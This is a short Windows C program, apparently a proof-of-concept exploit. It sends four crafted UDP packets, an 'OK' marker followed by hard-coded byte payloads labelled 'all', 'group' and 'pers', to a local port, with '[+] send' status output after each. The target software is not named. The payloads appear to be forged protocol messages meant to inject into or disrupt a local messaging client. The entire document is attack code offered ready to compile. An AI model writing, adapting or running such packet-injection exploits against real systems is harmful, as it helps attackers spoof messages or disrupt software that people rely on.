#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32")

#define DEST_ADDR "127.0.0.1"

unsigned char FLAP[] = "OK";

unsigned char all[] =
"\x00\x18\x00\x00\x0B\x20\x00\x00\x00\x00\x00\x00\x08\xFF\xFF\xFF"
"\x00\x03\x35\x00\x20\xB7\xD1\xE3\xD9\x17\x04\x00\xD1\x00\x0B\x00"
"\x00\x00";
unsigned char group[] = 
"\x00\x18\x00\x00\x0B\x20\x00\x00\x00\x00\x00\x00\x00\x0e\x90\x5b"
"\x00\x23\x7f\x00\x20\xB7\xD1\xE3\xD9\x17\x04\x00\xE1\x00\x04\x00"
"\x00\x00";
unsigned char pers[] = 
"\x00\x18\x00\x00\x0B\x20\x00\x00\x00\x00\x03\x00\x00\x00\x03\x34"
"\x00\x03\x35\x00\x20\xB7\xD1\xE3\xD9\x17\x04\x00\xF1\x01\x3A\x00"
"\x00\x00";

int main (unsigned char argc, char *argv[]) {
    WSADATA WSAData;
    SOCKET my_sock;
    SOCKADDR_IN dest_addr;
    unsigned short i;

    if(argc != 2) {
        printf("- Invalid parameters!!!\n");
        printf("- Usage %s <source port> \n", argv[0]);
        printf("\n use default port \n");
        i = 44065;
    } else i = atoi(argv[1]);

    printf("\n use port: %d\n", i);

    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0){
      printf("WSAStartup error.Error:%d\n",WSAGetLastError());
      return 0;
    }

    my_sock=socket(AF_INET, SOCK_DGRAM, 0);
    if (my_sock==INVALID_SOCKET)
    {
      printf("socket() error: %d\n",WSAGetLastError());
      WSACleanup();
      return -1;
    }

    dest_addr.sin_family=AF_INET;
    dest_addr.sin_addr.s_addr=inet_addr(DEST_ADDR);
    dest_addr.sin_port=htons(i);

    sendto(my_sock, FLAP, sizeof(FLAP)-1, 0, (SOCKADDR*)&dest_addr, sizeof(dest_addr));
    printf("[+] send OK \n");
    Sleep(1000);
    sendto(my_sock, all, sizeof(all)-1, 0, (SOCKADDR*)&dest_addr, sizeof(dest_addr));
    printf("[+] send all \n");
    Sleep(1000);
    sendto(my_sock, group, sizeof(group)-1, 0, (SOCKADDR*)&dest_addr, sizeof(dest_addr));
    printf("[+] send group\n");
    Sleep(1000);
    sendto(my_sock, pers, sizeof(pers)-1, 0, (SOCKADDR*)&dest_addr, sizeof(dest_addr));
    printf("[+] send pers\n");

    printf("\npress any key to exit \n");
    getch();

    closesocket(my_sock);
    WSACleanup();
    return 0;
}



